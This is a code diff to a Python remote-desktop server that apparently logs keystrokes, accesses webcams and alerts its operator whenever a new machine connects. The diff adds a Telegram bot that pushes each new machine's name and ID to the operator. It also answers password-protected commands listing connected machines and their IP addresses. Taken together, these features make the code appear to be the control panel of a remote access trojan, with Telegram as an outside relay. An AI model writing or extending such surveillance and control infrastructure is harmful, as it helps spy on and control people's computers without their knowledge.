@@ -33,7 +33,8 @@ sys.path.insert(0, str(Path(__file__).parent.parent))
 from config import (
     DEFAULT_SERVER_HOST, DEFAULT_SERVER_PORT,
     SERVER_CERT, SERVER_KEY, CA_CERT, SERVER_LOG, KEYLOG_FILE, KEYLOG_ENABLED,
-    SERVER_DATA_DIR, DELETED_CLIENTS_FILE
+    SERVER_DATA_DIR, DELETED_CLIENTS_FILE,
+    TELEGRAM_ENABLED, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, TELEGRAM_BOT_PASSWORD
 )
 from common.protocol import FrameEncoder, ProtocolHandler, MessageType
 
@@ -108,6 +109,8 @@ class RemoteDesktopServer:
         self.deleted_clients = {}  # Store deleted clients: {client_id: {'name': pc_name}}
         self.gui_callback = None  # Callback for GUI notifications
         self.webcam_error_callback = None  # Callback for webcam errors
+        self.new_client_callback = None  # Callback for new client connections (web notifications)
+        self.telegram_authenticated_users = set()  # Store authenticated Telegram user chat IDs
         
         # Setup keylog file
         if KEYLOG_ENABLED and KEYLOG_FILE:
@@ -120,6 +123,12 @@ class RemoteDesktopServer:
         
         # Load deleted clients from file
         self._load_deleted_clients()
+        
+        # Start Telegram bot if enabled
+        if TELEGRAM_ENABLED and TELEGRAM_BOT_TOKEN:
+            telegram_bot_thread = threading.Thread(target=self._start_telegram_bot, daemon=True)
+            telegram_bot_thread.start()
+            logger.info("Telegram bot started (password required for commands)")
     
     def _load_deleted_clients(self):
         """Load deleted clients list from file"""
@@ -187,6 +196,172 @@ class RemoteDesktopServer:
         sys.stdout.flush()
         return context
     
+    def _send_telegram_notification(self, message: str):
+        """Send Telegram notification"""
+        if not TELEGRAM_ENABLED or not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
+            return
+        
+        try:
+            import requests
+            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+            data = {
+                "chat_id": TELEGRAM_CHAT_ID,
+                "text": message,
+                "parse_mode": "HTML"
+            }
+            # Use a thread to avoid blocking
+            def send_request():
+                try:
+                    response = requests.post(url, json=data, timeout=5)
+                    if response.status_code == 200:
+                        logger.info(f"Telegram notification sent: {message}")
+                    else:
+                        logger.warning(f"Telegram notification failed: {response.status_code}")
+                except Exception as e:
+                    logger.debug(f"Error sending Telegram notification: {e}")
+            
+            threading.Thread(target=send_request, daemon=True).start()
+        except ImportError:
+            logger.warning("requests library not available for Telegram notifications")
+        except Exception as e:
+            logger.debug(f"Could not send Telegram notification: {e}")
+    
+    def _send_telegram_message(self, chat_id: str, message: str, parse_mode: str = "HTML"):
+        """Send a Telegram message to a specific chat"""
+        if not TELEGRAM_ENABLED or not TELEGRAM_BOT_TOKEN:
+            return False
+        
+        try:
+            import requests
+            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+            data = {
+                "chat_id": chat_id,
+                "text": message,
+                "parse_mode": parse_mode
+            }
+            response = requests.post(url, json=data, timeout=5)
+            return response.status_code == 200
+        except Exception as e:
+            logger.debug(f"Error sending Telegram message: {e}")
+            return False
+    
+    def _handle_telegram_command(self, chat_id: str, message_text: str):
+        """Handle Telegram bot commands"""
+        if not TELEGRAM_ENABLED:
+            return
+        
+        message_text = message_text.strip()
+        
+        # Check if user is authenticated
+        if chat_id not in self.telegram_authenticated_users:
+            # Check if message is password
+            if message_text.lower() == TELEGRAM_BOT_PASSWORD.lower():
+                self.telegram_authenticated_users.add(chat_id)
+                self._send_telegram_message(chat_id, "✅ <b>Authentication Successful!</b>\n\nYou can now use bot commands.\n\nAvailable commands:\n/status - Get server status\n/clients - List connected clients\n/help - Show help")
+                logger.info(f"Telegram user {chat_id} authenticated successfully")
+            else:
+                self._send_telegram_message(chat_id, "🔒 <b>Authentication Required</b>\n\nPlease send the password to authenticate.\n\nUsage: Send the password as a message.")
+            return
+        
+        # User is authenticated - handle commands
+        if message_text.lower() in ['/start', '/help']:
+            help_text = """🤖 <b>Remote Desktop Viewer Bot</b>
+
+<b>Available Commands:</b>
+/status - Get server status
+/clients - List all connected clients
+/help - Show this help message
+
+<b>Note:</b> You must authenticate with the password before using commands."""
+            self._send_telegram_message(chat_id, help_text)
+        
+        elif message_text.lower() == '/status':
+            status_text = f"🖥️ <b>Server Status</b>\n\n"
+            status_text += f"📊 <b>Connected Clients:</b> {len(self.clients)}\n"
+            status_text += f"🕒 <b>Server Time:</b> {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+            if self.clients:
+                status_text += f"\n<b>Active Clients:</b>\n"
+                for client_id, client_info in list(self.clients.items())[:5]:  # Show first 5
+                    pc_name = client_info.get('pc_name', client_id)
+                    status_text += f"  • {pc_name}\n"
+                if len(self.clients) > 5:
+                    status_text += f"  ... and {len(self.clients) - 5} more"
+            else:
+                status_text += "\nNo clients currently connected."
+            self._send_telegram_message(chat_id, status_text)
+        
+        elif message_text.lower() == '/clients':
+            if not self.clients:
+                self._send_telegram_message(chat_id, "📋 <b>Connected Clients</b>\n\nNo clients currently connected.")
+                return
+            
+            clients_text = f"📋 <b>Connected Clients ({len(self.clients)})</b>\n\n"
+            for idx, (client_id, client_info) in enumerate(self.clients.items(), 1):
+                pc_name = client_info.get('pc_name', client_id)
+                display_count = client_info.get('display_count', 1)
+                ip_address = client_info.get('ip_address', 'N/A')
+                clients_text += f"<b>{idx}. {pc_name}</b>\n"
+                clients_text += f"   ID: <code>{client_id}</code>\n"
+                clients_text += f"   IP: {ip_address}\n"
+                clients_text += f"   Displays: {display_count}\n\n"
+            
+            self._send_telegram_message(chat_id, clients_text)
+        
+        else:
+            self._send_telegram_message(chat_id, "❓ Unknown command. Use /help to see available commands.")
+    
+    def _start_telegram_bot(self):
+        """Start Telegram bot polling for messages"""
+        if not TELEGRAM_ENABLED or not TELEGRAM_BOT_TOKEN:
+            return
+        
+        try:
+            import requests
+            import time
+            
+            logger.info("Starting Telegram bot message handler...")
+            last_update_id = 0
+            
+            while True:
+                try:
+                    # Get updates from Telegram
+                    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
+                    params = {"offset": last_update_id + 1, "timeout": 30}
+                    response = requests.get(url, params=params, timeout=35)
+                    
+                    if response.status_code == 200:
+                        data = response.json()
+                        if data.get('ok') and data.get('result'):
+                            for update in data['result']:
+                                last_update_id = update['update_id']
+                                
+                                if 'message' in update:
+                                    message = update['message']
+                                    chat_id = str(message['chat']['id'])
+                                    text = message.get('text', '')
+                                    
+                                    # Handle command in a thread to avoid blocking
+                                    threading.Thread(
+                                        target=self._handle_telegram_command,
+                                        args=(chat_id, text),
+                                        daemon=True
+                                    ).start()
+                    
+                    # Small delay before next request
+                    time.sleep(1)
+                    
+                except requests.exceptions.Timeout:
+                    # Timeout is expected - just continue
+                    continue
+                except Exception as e:
+                    logger.error(f"Error in Telegram bot polling: {e}")
+                    time.sleep(5)  # Wait longer on error
+                    
+        except ImportError:
+            logger.warning("requests library not available for Telegram bot")
+        except Exception as e:
+            logger.error(f"Telegram bot polling failed: {e}")
+    
     def _alert_new_client(self, pc_name: str, client_id: str):
         """Alert when a new client connects"""
         # System beep (cross-platform)
@@ -202,6 +377,10 @@ class RemoteDesktopServer:
                 print("\a", end="", flush=True)
         except Exception as e:
             logger.debug(f"Could not play beep sound: {e}")
+        
+        # Telegram notification
+        telegram_message = f"🔔 <b>New Client Connected</b>\n\n📱 <b>Machine:</b> {pc_name}\n🆔 <b>ID:</b> {client_id}\n⏰ <b>Time:</b> {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+        self._send_telegram_notification(telegram_message)
         
         # GUI notification (if GUI is available)
         if self.gui_callback:
@@ -312,6 +491,13 @@ class RemoteDesktopServer:
         
         # Alert: New client connected
         self._alert_new_client(pc_name, actual_client_id)
+        
+        # Web notification callback (for browser alerts)
+        if self.new_client_callback:
+            try:
+                self.new_client_callback(pc_name, actual_client_id)
+            except Exception as e:
+                logger.error(f"Error in new client callback: {e}")
         
         self.clients[actual_client_id] = {
             'reader': reader,
